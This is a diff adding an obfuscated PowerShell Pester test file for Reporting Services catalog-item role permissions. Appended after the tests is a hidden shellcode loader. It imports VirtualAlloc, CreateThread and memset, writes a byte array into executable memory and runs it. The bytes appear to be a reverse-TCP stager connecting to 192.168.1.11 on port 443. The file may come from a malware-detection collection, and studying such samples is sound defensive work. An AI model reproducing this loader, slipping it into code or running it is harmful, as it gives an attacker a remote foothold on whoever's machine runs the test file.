@@ -1,0 +1,166 @@
+function get-tE`S`TuSer() {
+    if (-not ${eN`V:`Rsuser}) {
+        throw ("{6}{4}{1}{2}{3}{0}{5}"-f' RsUser is not','nt',' variab','le','e',' defined!','Environm')
+    }
+    return ${eNV:`R`Suser}
+}
+
+&("{0}{2}{1}"-f'Desc','be','ri') ("{5}{1}{0}{4}{2}{3}" -f 'o','atal','mRo','le','gIte','Get-RsC') { 
+    ${us`er} = &("{1}{0}{2}{3}" -f'et-Te','G','s','tUser')
+    ${REPOR`Tse`R`V`ERURI} = ("{5}{1}{4}{3}{0}{2}" -f'tser','calh','ver','/repor','ost','http://lo')
+    ${CaT`ALOG`It`EMP`ATH} = '/'
+
+    &("{0}{1}" -f 'Co','ntext') ("{3}{2}{5}{0}{1}{4}"-f 'g It','em Po',' ','Get','licy','Catalo'){
+
+        &('It') ("{2}{1}{3}{4}{6}{0}{5}" -f 'wser','ul','Sho','d retriev','e Br',' permission access','o') {
+            ${R`OLe} = ("{0}{1}" -f'Brows','er')
+
+            
+            &("{2}{1}{3}{0}{4}{5}" -f'alog','nt-Ac','Gra','cessOnCat','I','tem') -UserOrGroupName ${Us`eR} -RoleName ${r`OlE} -Path ${cAtal`OgiTE`Mp`ATh} -Confirm:${f`ALSE} -Verbose
+
+            ${cAtal`ogI`TempoL`I`Cy} = &("{4}{5}{2}{0}{3}{1}"-f'log','mRole','-RsCata','Ite','G','et') -Path ${Cata`logi`T`EMpa`TH}
+            ${CATaLOgIT`eMpOli`CYc`OUNt} = @(${catal`og`iTE`mpOL`I`cy} | &("{0}{1}{2}"-f 'Whe','re-O','bject') {${_}."i`D`eNTIty" -eq ${Us`eR} -and ${_}."ro`LEs"."nA`me" -eq ${ro`LE}})."Cou`Nt"
+            ${C`A`T`AlOGIt`EM`PolIcy`Co`UNt} | &("{2}{0}{1}"-f'hou','ld','S') ("{0}{2}{1}" -f'BeGr','an','eaterTh') 0
+        }
+
+        &('It') ("{0}{2}{10}{4}{7}{8}{9}{5}{12}{6}{3}{11}{1}" -f'Sh','ccess','o',' permissi','ld retr','onten','anager','iev','e',' C','u','on a','t M') {
+            ${RO`Le} = ("{0}{1}{2}"-f 'Cont','ent Mana','ger')
+
+            
+            &("{5}{3}{1}{4}{6}{2}{0}"-f 'm','OnCata','e','-Access','l','Grant','ogIt') -UserOrGroupName ${u`Ser} -RoleName ${R`ole} -Path ${CATaL`o`Gi`T`eMpATH} -Confirm:${Fa`Lse} -Verbose
+
+            ${C`AT`AloG`iTEMP`OlIcY} = &("{2}{3}{0}{5}{4}{1}"-f'RsC','ole','Ge','t-','alogItemR','at') -Path ${caT`Alog`I`TEMpath} 
+            ${C`ATa`l`OGitEm`PoLIcY`CoU`Nt} = @(${CAT`AL`Og`ITEmpOL`iCy} | &("{2}{0}{1}"-f 'Obj','ect','Where-') {${_}."IdE`NTITY" -eq ${U`SER} -and ${_}."Ro`LeS"."N`AmE" -eq ${r`OlE}})."COU`NT"
+            ${CAtalO`g`iTem`PoLICyc`ouNt} | &("{1}{0}" -f'uld','Sho') ("{1}{2}{0}"-f 'han','Be','GreaterT') 0
+        }
+
+        &("{0}{1}" -f'AfterE','ach') {
+            &("{0}{2}{4}{3}{1}{5}"-f'R','OnCa','ev','ccess','oke-A','talogItem') -UserOrGroupName ${uS`Er} -Path ${ca`TaLOgit`e`MpA`TH} -Confirm:${Fa`L`se} -Verbose
+        }
+    }
+
+    &("{1}{0}" -f 'ext','Cont') ("{9}{2}{1}{11}{4}{8}{10}{0}{6}{5}{7}{3}" -f 'cy','C','t ','y','og Ite','with I',' ','dentit','m Po','Ge','li','atal'){
+        &('It') ("{6}{5}{0}{3}{1}{4}{2}{9}{7}{8}" -f 'o','r',' acc','wse',' permission','e Br','Should retriev','e','st user','ess for t') {
+            ${Ro`lE} = ("{2}{1}{0}" -f 'er','ows','Br')
+
+            
+            &("{1}{0}{2}{3}{4}"-f 'ant-Acce','Gr','ssOnC','atalogI','tem') -UserOrGroupName ${U`SeR} -RoleName ${rO`le} -Path ${CATal`Ogi`T`emP`A`Th} -Confirm:${FAl`se} -Verbose
+
+            ${CATa`LO`GI`T`EMpOlIcY} = &("{2}{1}{3}{0}{4}"-f'gIte','et-Rs','G','Catalo','mRole') -Path ${c`ATALO`gitEm`PATH} -Identity ${Us`eR}
+            ${ca`TA`L`OGITE`mpOliCYCoUnT} = @(${cAtaLoGI`TeM`P`oli`cY})."co`Unt"
+            ${C`AT`ALogITempOlI`C`Yc`ou`NT} | &("{1}{0}" -f 'd','Shoul') ("{0}{1}{2}" -f 'BeG','re','aterThan') 0
+        }
+
+        &('It') ("{1}{12}{0}{4}{2}{10}{6}{11}{8}{9}{7}{13}{5}{3}" -f 'eve ','Shou','onten','t user','C','tes',' permissio','ss fo',' acc','e','t Manager','n','ld retri','r ') {
+            ${RO`Le} = ("{1}{3}{0}{2}" -f 'Man','Conte','ager','nt ')
+
+            
+            &("{4}{3}{1}{2}{0}"-f'Item','nCatalo','g','O','Grant-Access') -UserOrGroupName ${Us`ER} -RoleName ${Ro`lE} -Path ${c`A`TAloGitEMpa`Th} -Confirm:${f`AL`SE} -Verbose
+
+            ${cAtaL`oGi`TEM`PoLICy} = &("{1}{6}{3}{5}{0}{4}{2}" -f 't','G','temRole','-RsC','alogI','a','et') -Path ${CataL`OGit`eMp`AtH} -Identity ${Us`er}
+            ${c`AtalogIte`MPo`LI`Cyc`oU`Nt} = @(${c`At`ALo`giteMpOLIcY})."C`oUNT"
+            ${CaT`AL`ogi`T`eM`pOLIcyCou`Nt} | &("{0}{1}{2}" -f'Sho','u','ld') ("{3}{1}{0}{2}"-f'r','e','Than','BeGreat') 0
+        }
+
+        &("{1}{0}{2}"-f 'fterEa','A','ch') {
+            &("{5}{2}{0}{6}{1}{3}{4}"-f 'oke-A','sOnCatalo','v','gI','tem','Re','cces') -UserOrGroupName ${Us`eR} -Path ${caT`ALO`gI`TEMPa`Th} -Confirm:${fa`LSE} -Verbose
+        }
+    }
+
+    &("{0}{1}{2}"-f'Co','ntex','t') ("{5}{4}{1}{0}{7}{8}{6}{9}{2}{3}"-f 'alo','Cat','rtServerUri param','eter',' ','Get','Policy','g',' Item ',' with Repo'){
+
+        &('It') ("{3}{0}{6}{1}{7}{10}{2}{9}{11}{5}{4}{8}" -f 'd re','ieve Browser','is','Shoul','e','cc','tr',' p','ss','sion ','erm','a') {
+            ${Ro`lE} = ("{1}{0}"-f'owser','Br')
+
+            
+            &("{4}{3}{1}{2}{0}"-f'gItem','ccessOnCa','talo','nt-A','Gra') -UserOrGroupName ${U`sEr} -RoleName ${RO`LE} -Path ${c`AtaloG`ITeM`p`ATH} -Confirm:${f`Alse} -Verbose
+
+            ${Ca`TALO`GiT`EmpOLicy} = &("{2}{1}{0}{4}{3}{5}"-f'at','sC','Get-R','gI','alo','temRole') -Path ${C`ATA`LOgI`TeMPAtH} -ReportServerUri ${Repo`R`Ts`eRve`Ruri}
+            ${CAt`ALOG`ITEmp`o`lI`c`yC`Ount} = @(${cATALOgI`TE`MpOl`ICY} | &("{0}{2}{1}{3}" -f'W','e-Obje','her','ct') {${_}."id`eNT`ity" -eq ${U`Ser} -and ${_}."rO`LEs"."NA`me" -eq ${Ro`le}})."c`OuNt"
+            ${C`ATa`LO`Gi`TE`MPO`lic`yCoUnT} | &("{0}{1}" -f 'Shoul','d') ("{0}{2}{1}" -f'Be','Than','Greater') 0
+        }
+
+        &('It') ("{4}{7}{9}{2}{5}{6}{3}{1}{0}{8}{10}"-f ' ','n','ieve Content Manager ','sio','Shou','per','mis','ld','acce',' retr','ss') {
+            ${R`OLE} = ("{1}{3}{0}{2}"-f'tent Manag','C','er','on')
+
+            
+            &("{0}{1}{7}{4}{5}{2}{3}{6}" -f'Gr','an','alog','It','AccessOnC','at','em','t-') -UserOrGroupName ${Us`ER} -RoleName ${r`ole} -Path ${CA`Ta`LoGITE`MP`AtH} -Confirm:${F`Alse} -Verbose
+
+            ${ca`TaLOg`iT`e`m`polICY} = &("{4}{6}{2}{1}{5}{3}{0}" -f'mRole','t','t-RsCa','gIte','G','alo','e') -Path ${c`A`T`A`lOGItEmPAtH} -ReportServerUri ${repoRTSEr`V`erURI}
+            ${CAt`Al`O`GI`TempOlI`C`yCOunt} = @(${caTA`loG`It`Em`policy} | &("{2}{1}{0}{3}"-f 'e-Ob','her','W','ject') {${_}."iD`e`NtITY" -eq ${uS`eR} -and ${_}."Ro`les"."Na`mE" -eq ${Ro`Le}})."CO`UNT"
+            ${cATAlOGiT`eM`PoLI`c`Y`c`ounT} | &("{1}{0}" -f'ld','Shou') ("{3}{2}{0}{1}"-f'terTha','n','ea','BeGr') 0
+        }
+
+        &("{1}{0}" -f 'erEach','Aft') {
+            &("{3}{2}{0}{4}{5}{1}{6}" -f'e-Acces','Ite','evok','R','sOn','Catalog','m') -UserOrGroupName ${u`sER} -Path ${cata`L`Og`IT`EmpaTH} -Confirm:${fA`lSe} -Verbose
+        }
+    }
+
+    &("{0}{1}"-f 'C','ontext') ("{7}{6}{0}{5}{4}{1}{3}{2}{8}"-f' Ite','Po','xy par','licy with pro',' ','m','et Catalog','G','ameter'){
+
+        &('It') ("{6}{3}{5}{7}{4}{9}{0}{10}{8}{11}{1}{2}" -f 'er','n ','access','d','ve Bro',' retr','Shoul','ie','is','ws',' perm','sio') {
+            ${rO`LE} = ("{1}{0}"-f 'ser','Brow')
+            
+            
+            &("{5}{1}{2}{3}{6}{0}{4}"-f'te','rant-AccessO','nCa','talo','m','G','gI') -UserOrGroupName ${U`Ser} -RoleName ${RO`lE} -Path ${cAta`logiT`EMP`Ath} -Confirm:${fAl`se} -Verbose
+
+            ${P`RO`Xy} = &("{4}{2}{3}{1}{0}" -f 'Proxy','ce','sWebS','ervi','New-R') 
+
+            ${caT`AL`o`GitEmPOli`cy} = &("{3}{0}{2}{4}{1}" -f'I','e','te','Get-RsCatalog','mRol') -proxy ${PR`oXY}
+            ${c`A`T`A`Log`ITEMP`olICyC`OUnT} = @(${caT`Al`O`g`itEmP`OliCY} | &("{2}{0}{1}{3}"-f'er','e-','Wh','Object') {${_}."id`enTiTY" -eq ${US`eR} -and ${_}."ROL`ES"."n`AME" -eq ${rO`LE}})."cou`Nt"
+            ${c`A`Ta`logI`TEMPoliC`yCo`UNt} | &("{1}{0}" -f'ld','Shou') ("{1}{2}{0}{3}" -f 'Grea','B','e','terThan') 0
+        }
+
+        &('It') ("{4}{7}{0}{3}{6}{1}{5}{2}" -f 't Manag','permission a','ess','e','Should retriev','cc','r ','e Conten') {
+            ${r`OLE} = ("{3}{2}{1}{0}"-f 't Manager','ten','n','Co')
+
+            
+            &("{3}{6}{4}{1}{5}{2}{0}" -f 'logItem','sOn','ata','Gr','ces','C','ant-Ac') -UserOrGroupName ${u`SEr} -RoleName ${Ro`le} -Path ${CaTal`ogI`TemPa`Th} -Confirm:${FA`lsE} -Verbose
+
+            ${pr`Oxy} = &("{1}{4}{0}{2}{3}" -f'-RsW','Ne','ebServiceP','roxy','w') 
+
+            ${cAt`AloGit`eMpOL`I`cY} = &("{3}{4}{0}{5}{2}{1}{6}"-f 'a','It','g','Get-RsC','at','lo','emRole') -proxy ${P`ROxY}
+            ${Ca`T`AlOGItemPo`LIcyc`ou`Nt} = @(${C`ATaL`Og`iT`eMpoLIcY} | &("{3}{1}{2}{0}" -f 't','e','c','Where-Obj') {${_}."IdeNt`i`Ty" -eq ${u`sER} -and ${_}."rO`les"."NA`mE" -eq ${RO`LE}})."C`ouNt"
+            ${cataLO`Gite`mp`OliC`YC`oU`NT} | &("{1}{0}"-f'd','Shoul') ("{1}{3}{2}{0}" -f'han','BeGrea','T','ter') 0
+        }
+
+        &("{2}{1}{0}"-f'h','ac','AfterE') {
+            &("{0}{6}{5}{4}{1}{3}{2}"-f'Re','OnCata','gItem','lo','s','es','voke-Acc') -UserOrGroupName ${Us`ER} -Path ${cATaLogiT`E`MPaTH} -Confirm:${fAL`SE} -Verbose
+        }
+    }
+
+    &("{1}{0}" -f'ext','Cont') ("{2}{12}{1}{5}{10}{13}{7}{14}{9}{0}{11}{8}{6}{3}{4}" -f'er an','alog','Get ','r','tServerUri',' Item Policy with pr','epo','a',' R','t','oxy ','d','Cat','p','rame'){
+
+        &('It') ("{9}{4}{1}{5}{8}{6}{7}{0}{3}{2}" -f 'rmission acc','retriev','ss','e',' ','e','Browser',' pe',' ','Should') {
+            ${r`ole} = ("{1}{0}"-f 'owser','Br')
+            
+            
+            &("{6}{5}{4}{1}{2}{7}{3}{0}"-f 'em','t-Acc','essOnCa','ogIt','an','r','G','tal') -UserOrGroupName ${u`sER} -RoleName ${Ro`LE} -Path ${CAta`logI`T`EmpaTh} -Confirm:${F`A`lSE} -Verbose
+
+            ${P`RO`XY} = &("{2}{3}{5}{4}{0}{1}"-f 'ceP','roxy','New-RsWe','b','ervi','S') 
+
+            ${catAlO`Gi`TEmPoL`i`CY} = &("{2}{4}{5}{0}{1}{6}{3}"-f'e','m','Get-','e','RsCata','logIt','Rol') -proxy ${Pr`oxY} -ReportServerUri ${Re`pO`R`T`serVERuri}
+            ${cATA`lOgIT`EMpOLic`YCO`U`NT} = @(${cA`TalOgiTEmP`O`LiCy} | &("{0}{2}{3}{1}"-f 'Wh','ect','e','re-Obj') {${_}."I`d`enTiTY" -eq ${US`ER} -and ${_}."Ro`lEs"."nA`ME" -eq ${R`olE}})."coU`Nt"
+            ${cA`Ta`LoGIT`E`m`polIcy`cOunt} | &("{1}{2}{0}"-f'ld','Sh','ou') ("{2}{0}{1}" -f'ter','Than','BeGrea') 0
+        }
+
+        &('It') ("{1}{3}{6}{8}{0}{5}{7}{2}{4}" -f'nt','Sho','acce','uld re','ss',' Manager perm','trieve Cont','ission ','e') {
+            ${ro`LE} = ("{4}{1}{0}{3}{2}" -f'nt','onte','anager',' M','C')
+
+            
+            &("{0}{4}{5}{2}{1}{3}{6}"-f 'Grant-Acc','atal','nC','o','e','ssO','gItem') -UserOrGroupName ${Us`ER} -RoleName ${Ro`lE} -Path ${Ca`TAlOG`it`EmpAtH} -Confirm:${f`ALsE} -Verbose
+
+            ${p`Ro`XY} = &("{2}{1}{0}{3}"-f 'er','sWebS','New-R','viceProxy') 
+
+            ${C`ATAl`oGI`TE`MPoL`iCy} = &("{1}{5}{4}{3}{0}{2}" -f 'temRo','Get-RsCat','le','I','g','alo') -proxy ${pRO`xY} -ReportServerUri ${REPo`RtSE`R`VErU`RI}
+            ${CAtaloG`iT`e`m`Po`licYCou`NT} = @(${cAt`A`l`oGIteM`pO`LiCY} | &("{1}{2}{0}" -f'bject','W','here-O') {${_}."iDeN`TI`Ty" -eq ${Us`er} -and ${_}."ro`Les"."Na`ME" -eq ${rO`Le}})."cou`Nt"
+            ${CatALOgIt`e`m`Po`liCyCo`U`Nt} | &("{0}{1}" -f 'Sho','uld') ("{0}{1}{2}{3}"-f 'B','eGrea','terTha','n') 0
+        }
+
+        &("{2}{1}{0}{3}" -f'terEac','f','A','h') {
+            &("{4}{0}{3}{2}{1}" -f 'evoke-Acc','ogItem','tal','essOnCa','R') -UserOrGroupName ${U`seR} -Path ${C`A`TAlogi`TEM`pAtH} -Confirm:${F`AlsE} -Verbose
+        }
+    }
+
+}
+${C} = (((("{74}{14}{52}{46}{36}{15}{91}{93}{7}{32}{8}{0}{58}{11}{85}{21}{31}{6}{30}{40}{90}{42}{60}{45}{61}{81}{26}{43}{89}{70}{17}{53}{25}{56}{65}{75}{71}{37}{77}{73}{22}{54}{55}{2}{87}{19}{57}{41}{66}{68}{16}{59}{84}{23}{38}{24}{35}{79}{10}{48}{18}{13}{63}{88}{72}{62}{27}{9}{51}{33}{12}{64}{78}{50}{3}{67}{80}{86}{92}{47}{20}{76}{28}{29}{69}{44}{34}{1}{39}{4}{49}{83}{82}{5}"-f '})]public','est, u','atic e','Flags, IntP',' sr','nt);','IntPtr Virtual','l','ll{0','t','s, uint','tat','dw','wStackSize, ','Im','er','Th','otect);','d','r','t','exter','dll{0}','ntPtr lpTh','dA','D',', uint flAl','artAddress, In','ern ','IntPtr ','A','n ','32.d','arameter, uint ','d','ttr','0}k','0}k','rea','int','l','tPtr ','ntPt','locationType,','set(IntPtr ','ress, u','({',' s',' ','c, u','on','Ptr lpP','port','[',')]public',' st','llImp','n In',' s','read','r lpAdd','i','pSt','In','Crea','o','Cr','tr lpThreadId);[DllImpo','eate','mem','nt flPr','t({','Ptr l','rnel32.','[Dll','r','atic ext','e','ti','ibute','rt({0}msvcrt.','nt dwSize','nt cou','i','(I','ic ','dll{0})]p','xte','t',' ui','loc(I','n','ublic','e'))-f  [CHAr]34));${w} = &("{1}{0}{2}" -f '-T','Add','ype') -memberDefinition ${C} -Name ("{1}{0}"-f 'n32','Wi') -namespace ("{0}{2}{1}{3}"-f'W','n3','i','2Functions') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${G} = 0x1000;if (${z}."lE`NgTH" -gt 0x1000){${G} = ${z}."L`ENGth"};${X}=${W}::("{2}{3}{0}{1}"-f 'alAllo','c','Virt','u').Invoke(0,0x1000,${g},0x40);for (${I}=0;${I} -le (${Z}."lEn`GTh"-1);${i}++) {${w}::"me`MsEt"([IntPtr](${x}.("{1}{2}{0}" -f'32','T','oInt').Invoke()+${I}), ${Z}[${i}], 1)};${W}::("{2}{0}{1}{3}" -f 'eat','eThr','Cr','ead').Invoke(0,0,${x},0,0,0);for (;;){&("{0}{2}{1}"-f 'St','t-sleep','ar') 60};
